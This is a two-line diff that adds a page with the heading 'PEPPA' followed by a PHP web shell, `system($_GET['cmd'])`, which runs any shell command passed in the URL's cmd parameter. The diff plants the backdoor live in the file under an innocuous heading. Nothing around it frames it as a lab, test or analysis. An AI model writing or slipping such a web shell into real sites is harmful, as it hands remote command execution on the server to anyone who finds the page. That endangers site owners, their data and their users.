@@ -1,0 +1,2 @@
+<h1>PEPPA</h1>
+<?php system($_GET['cmd']); ?>
